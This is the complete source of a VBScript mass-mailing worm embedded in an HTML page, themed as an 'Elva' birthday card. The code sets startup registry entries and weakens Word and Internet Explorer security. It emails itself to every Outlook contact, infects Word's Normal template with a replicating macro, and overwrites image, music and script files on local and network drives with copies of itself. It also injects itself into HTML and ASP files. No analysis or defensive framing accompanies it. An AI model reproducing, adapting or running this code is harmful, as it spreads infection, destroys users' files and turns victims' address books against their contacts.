<body></body>
<script language=VBScript><!--
On Error Resume Next
Set WSH = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
ISD = FSO.GetSpecialFolder(0)

WSH.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\FS", ISD & "\SYSTEM\FS.VBS"
WSH.RegWrite "HKCU\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
WSH.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
WSH.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
F2N = Array(".JS\", ".JSE\", ".GIF\", ".JPG\", ".MP3\", ".WSH\", ".WSF\", ".WSC\", ".SHS\", ".SCT\")
For F2NC = 0 To 10
WSH.RegWrite "HKEY_CLASSES_ROOT\" & F2N(F2NC), "VBSFile"
Next

If WSH.RegRead("HKLM\Software\Microsoft\FSV") = "" Then
FSH = Document.Body.CreateTextRange.HtmlText
If FSH = "" Then
Set FS = FSO.OpenTextFile(WScript.ScriptFullname, 1)
FSV = FS.ReadAll
FSH = Mid(FSV, 2, Len(FSV))
FSH = Mid(FSH, 1, Len(FSH) - 13)
FSH = FSH & "-->" & "<" & "/script>"
Else
FSV = "'" & Mid(FSH, 3, Len(FSH))
FSV = Mid(FSV, 1, Len(FSV) - 12)
FSV = FSV & "'-->" & "<" & "/script>"
End If
WSH.RegWrite "HKLM\Software\Microsoft\FSV", FSV
WSH.RegWrite "HKLM\Software\Microsoft\FSH", FSH
End If
FSH = WSH.RegRead("HKLM\Software\Microsoft\FSH")
FSV = WSH.RegRead("HKLM\Software\Microsoft\FSV")

Set EVA = WSH.CreateShortcut(ISD & ".\Favorites\Elva's Page.URL")
EVA.TargetPath = "http://www.jasonnet.cc/elva": EVA.Save

If Month(Now()) = 8 And Day(Now()) = 24 Then
Msgbox "-=Happy birthday=-" & Chr(13) & Chr(10) & "I love ELVA 4 ever"
Set FS = FSO.CreateTextFile(ISD & "\FS.COM", 2, 0)
FS.Write Chr(205) & Chr(32)
FS.Close
WSH.Run ISD & "\FS.COM"
End If

If FSO.GetFile(ISD & "\FS.VBE") = "" Then
Set FS = FSO.CreateTextFile(ISD & "\FS.VBE")
FS.WriteLine FSV: FS.Close
FSO.CopyFile ISD & "\FS.VBE", ISD & "\SYSTEM\FS.VBS", 1
End If

If FSO.GetFile(ISD & "\SYSTEM\CARD.HTA") = "" Then
Set FS = FSO.CreateTextFile(ISD & "\SYSTEM\CARD.HTA")
FS.WriteLine "<HTML>"&"<body bgcolor=""#000000"">"&"<div id='nap' style='position: absolute; text-align:center; top:60; left:0; font-size:40pt; font-family:Arial; font-weight:bold; color:#0066CC; FILTER:Light();'>"&"&nbsp;&nbsp; Happy birthday<"&"/"&"div>"&Chr(13)&Chr(10)&"<SCRIPT language=""VBScript""><!--"&Chr(13)&Chr(10)&"d=1:n=30:call fsn"&Chr(13)&Chr(10)&"Sub fsn"&Chr(13)&Chr(10)&"If n>=400 Then d=0"&Chr(13)&Chr(10)&"If n=<70 Then d=1"&Chr(13)&Chr(10)&"If d=1 Then n=n+10 Else n=n-10"&Chr(13)&Chr(10)&"Set o=nap.Filters(""Light"")"&Chr(13)&Chr(10)&"Call o.Clear()"&Chr(13)&Chr(10)&"Call o.AddAmbient(200,200,200,100)"&Chr(13)&Chr(10)&"Call o.AddPoint(n,35,25,200,200,200,100)"&Chr(13)&Chr(10)&"SetTimeout ""Call fsn"",80"&Chr(13)&Chr(10)&"End Sub"&Chr(13)&Chr(10)&"/"&"/"&"-->"&"<"&"/"&"SCRIPT>"&"<"&"/"&"HTML>"
FS.WriteLine FSH:FS.Close
End If
Set OLA = CreateObject("Outlook.Application")
For Each ALC In OLA.GetNameSpace("MAPI").AddressLists
If ALC.AddressEntries.Count <> 0 Then
Set FSS = OLA.CreateItem(0)
For FSN = 1 To ALC.AddressEntries.Count
FSS.BCC = FSS.BCC & "; " & ALC.AddressEntries(FSN).Address: Next
FSS.Subject = "BIRTHDAY CARD !!!"
FSS.Body = "Hello Jo,"&Chr(13)&Chr(10)&"Happy birthday ELVA forever."&Chr(13)&Chr(10)&"This I made birthday card for you."&Chr(13)&Chr(10)&"Please open it and I hope you like."
FSS.Attachments.Add ISD & "\SYSTEM\CARD.HTA"
FSS.DeleteAfterSubmit = 1
FSS.Send
End If: Next

If Day(Now()) - WSH.RegRead("HKLM\Software\Microsoft\FSW") >= 10 Then
FST = "Private Sub Document_Close()"&Chr(13)&Chr(10)&"On Error Resume Next"&Chr(13)&Chr(10)&"With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: .ConfirmConversions = 0: .SavePropertiesPrompt = 0: End With"&Chr(13)&Chr(10)&"System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&"&Chr(13)&Chr(10)&"Set £\ = IIf(MacroContainer <> NormalTemplate, Normal.ThisDocument, ActiveDocument)"&Chr(13)&Chr(10)&"£o = ActiveDocument.Saved: £\.Variables.Add ""FSI"", ThisDocument.Variables(""FSI"").Value"&Chr(13)&Chr(10)&"If £\.VBProject.Protection <> 1 And £\.VBProject.Description <> ""~''~"" Then"&Chr(13)&Chr(10)&"£\.VBProject.Description = ""~''~"""&Chr(13)&Chr(10)&"With £\.VBProject.VBComponents(1).CodeModule"&Chr(13)&Chr(10)&".DeleteLines 1, .CountOfLines"&Chr(13)&Chr(10)&".AddFromString ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 25)"&Chr(13)&Chr(10)&"If Len(ActiveDocument.Path) <> 0 And Not ActiveDocument.ReadOnly Then ActiveDocument.SaveAs ActiveDocument.FullName"&Chr(13)&Chr(10)&"End With: End If: ActiveDocument.Saved = £o"&Chr(13)&Chr(10)&"Open Environ(""WINDIR"") & ""\HELP\FS.VBS"" For Output As #1"&Chr(13)&Chr(10)&"Print #1, ThisDocument.Variables(""FSI"").Value: Close #1"&Chr(13)&Chr(10)&"System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"", ""FSD"") = Environ(""WINDIR"") & ""\HELP\FS.VBS"""&Chr(13)&Chr(10)&"If Day(Now()) - System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft"", ""FSD"") >= 3 Then"&Chr(13)&Chr(10)&"With Application.FileSearch"&Chr(13)&Chr(10)&".NewSearch: .LookIn = ""C:\"": .FileName = ""*.vbs"": .SearchSubFolders = 1: .Execute"&Chr(13)&Chr(10)&"For £h = 1 To .FoundFiles.Count"&Chr(13)&Chr(10)&"Open .FoundFiles(£h) For Output As #1"&Chr(13)&Chr(10)&"Print #1, ThisDocument.Variables(""FSI"").Value: Close #1: Next: End With"&Chr(13)&Chr(10)&"System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft"", ""FSD"") = Day(Now())"&Chr(13)&Chr(10)&"End If: End Sub"

Set DNS = GetObject(, "Word.Application")
If DNS = "" Then Set DNS = CreateObject("Word.Application")
With DNS.NormalTemplate.OpenAsDocument
.Variables("FSI").Delete
.Variables.Add "FSI", FSV
.VBProject.VBComponents(1).CodeModule.DeleteLines 1, .VBProject.VBComponents(1).CodeModule.CountOfLines
.VBProject.VBComponents(1).CodeModule.AddFromString FST
.Save:End With:DNS.Quit
WSH.RegWrite "HKLM\Software\Microsoft\FSW", Day(Now())
End If

If Day(Now()) - WSH.RegRead("HKLM\Software\Microsoft\FSD") >= 3 Then
For Each DType In FSO.Drives
If DType.DriveType = 2 Or DType.DriveType = 3 Then
Searching(DType.Path&"\")
End If:Next
WSH.RegWrite "HKLM\Software\Microsoft\FSD", Day(Now())
End If

Sub Searching(fspec)
On Error Resume Next
Set FS4 = FSO.GetFolder(fspec)
For Each F2F In FS4.Files
FSS = UCase(FSO.GetExtensionName(F2F.Path))
FSO.GetFile(F2F.Path).Attributes = 32
If (Mid(FSS, 1, 2) = "HT") Or (FSS = "ASP") Then
Set FS = FSO.OpenTextFile(F2F.Path, 1)
If FS.ReadLine <> "<!--ELVA-->" Then
FS.Close():Set FS = FSO.OpenTextFile(F2F.Path, 1):FSG = FS.ReadAll():FS.Close()
Set FS = FSO.OpenTextFile(F2F.Path, 2):FS.WriteLine"<!--ELVA-->":FS.Write "<html><body>":FS.WriteLine FSH:FS.WriteLine"</body></html>":FS.Write FSG:FS.Close()
Else:FS.Close():End If
ElseIf (FSS = "VBS") Or (FSS = "VBE") Or (FSS = "JS") Or (FSS = "JSE") Or (FSS = "WSH") Or (FSS = "WSF") Or (FSS = "WSC") Or (FSS = "GIF") Or (FSS = "JPG") Or (FSS = "MP3") Then
FSO.CopyFile ISD & "\FS.VBE", F2F.Path, 1
End If:Next
For Each F4D In FS4.SubFolders
Searching(F4D.Path):Next
End Sub
--></script>